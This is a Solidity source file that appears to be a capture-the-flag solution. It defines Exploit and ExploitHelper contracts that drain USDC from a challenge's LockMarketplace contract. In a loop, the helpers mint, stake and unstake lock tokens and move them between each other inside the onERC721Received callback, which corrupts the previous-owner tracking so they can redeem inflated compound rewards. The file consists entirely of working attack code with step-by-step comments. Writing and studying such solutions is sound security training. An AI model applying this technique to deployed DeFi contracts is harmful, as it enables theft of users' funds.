// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Challenge} from "src/Challenge.sol";
import {LockMarketplace} from "src/LockMarketplace.sol";
import {LockToken} from "src/LockToken.sol";

contract ExploitHelper {
    LockMarketplace internal market;
    LockToken internal lockToken;
    IERC20 internal usdc;

    address internal helper2;
    address internal helper3;

    uint256 internal counts;
    uint256 internal ownedTokenId;

    constructor(Challenge challenge, address _helper2, address _helper3) {
        market = challenge.LOCK_MARKETPLACE();
        lockToken = challenge.LOCK_TOKEN();
        usdc = IERC20(challenge.USDC());
        helper2 = _helper2;
        helper3 = _helper3;
    }

    function mintWithUSDC(address to, uint256 usdcAmount) external returns (uint256) {
        usdc.approve(address(market), usdcAmount);
        return market.mintWithUSDC(to, usdcAmount);
    }

    function withdrawUSDC(uint256 tokenId, uint256 amount) external {
        market.withdrawUSDC(tokenId, amount);
    }

    function stake(uint256 tokenId, uint256 usdcAmount) external {
        lockToken.approve(address(market), tokenId);
        market.stake(tokenId, usdcAmount);
    }

    function unstake(address to, uint256 tokenId) external {
        market.unStake(to, tokenId);
    }

    function redeemCompoundRewards(uint256 tokenId) external {
        uint256 rewards = market.getAvailableRewards(address(this));
        rewards = rewards > usdc.balanceOf(address(market)) ? usdc.balanceOf(address(market)) : rewards;    
        market.redeemCompoundRewards(tokenId, rewards);
    }

    function transferFrom(address from, address to, uint256 tokenId) external {
        lockToken.transferFrom(from, to, tokenId);
    }

    function approve(address to, uint256 tokenId) external {
        lockToken.approve(to, tokenId);
    }

    function onERC721Received(address /*operator*/, address /*from*/, uint256 tokenId, bytes memory /*data*/) external returns (bytes4) {
        ownedTokenId = tokenId;
        // When helper1 contract mints new lock token,
        // the token id starts from 2, and expected to increase by 2 every time.
        // Following logic is only for the helper1 contract, not for helper2 contract.
        if (tokenId % 2 == 0) {
            counts = counts + 1;
            // The odd times is to call `mintWithUSDC` to receive the lock token,
            // the event times is to call `unstake` to receive the lock token.
            if (counts % 2 == 0) {
                // Transfer the lock token between accounts to change the `_prevOwners[id]`
                lockToken.transferFrom(address(this), helper3, tokenId);
                ExploitHelper(helper3).transferFrom(helper3, helper2, tokenId);
            }
        }
        return this.onERC721Received.selector;
    }

    function clear(address recipient) external {
        if (ownedTokenId > 0) {
            // Helper3 contract does not own the lock token.
            lockToken.transferFrom(address(this), recipient, ownedTokenId);
        }
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }
}

contract Exploit {
    function pwn(Challenge challenge) external {
        IERC20 usdc = challenge.USDC();
        LockMarketplace market = challenge.LOCK_MARKETPLACE();

        ExploitHelper helper3 = new ExploitHelper(challenge, address(0), address(0));
        ExploitHelper helper2 = new ExploitHelper(challenge, address(0), address(0));
        ExploitHelper helper1 = new ExploitHelper(challenge, address(helper2), address(helper3));

        for (uint256 i = 2; i < 26; ) {
            // Distribute the minimal USDC to the exploit helper contract
            usdc.transfer(address(helper1), 100e6);
            uint256 helper2Amount = usdc.balanceOf(address(this));
            if (i == 24) {
                // Loop for 11 times, will get 635_079e6 USDC,
                // Initial deposit amount is 1M USDC, so for the next time,
                // can only get 364_921e6 USDC,
                // should add extra 100 usdc that helper1 deposits.
                helper2Amount = 364921e6 + 100e6;
            }

            usdc.transfer(address(helper2), helper2Amount);

            // Helper1 mints with usdc
            helper1.mintWithUSDC(address(helper1), 100e6);
            // Helper1 stakes(mint fee is 20e6)
            helper1.stake(i, 80e6);
            // Helper2 mints with usdc
            helper2.mintWithUSDC(address(helper2), helper2Amount);
            // Helper2 stakes
            helper2.stake(i+1, helper2Amount - 20e6);

            // Helper1 unstakes
            // Will trigger `onERC721Received` in helper1 contract
            // to transfer the lock token to helper2 then helper3
            helper1.unstake(address(helper1), i);

            // Helper2 transfers the lock token to helper1 back
            helper2.transferFrom(address(helper2), address(helper1), i);
            // Helper1 withdraws USDC
            helper1.withdrawUSDC(i, market.getDeposit(i));

            helper2.unstake(address(helper2), i+1);
            // Helper2 withdraws USDC
            helper2.withdrawUSDC(i+1, market.getDeposit(i+1));

            // Helper1 approves helper3 to claim rewards
            helper1.approve(address(helper3), i);
            // Helper3 redeems compound rewards
            helper3.redeemCompoundRewards(i);

            // Helper1 transfers lock token to another account and withdraws USDC
            helper1.clear(address(uint160(uint160(address(this)) + i*3)));
            // Helper2 transfers lock token to another account and withdraws USDC
            helper2.clear(address(uint160(uint160(address(this)) + i*3+1)));
            // Helper3 withdraws USDC
            helper3.clear(address(uint160(uint160(address(this)) + i*3+2)));

            unchecked {
                i = i + 2;
            }
        }
    }
}
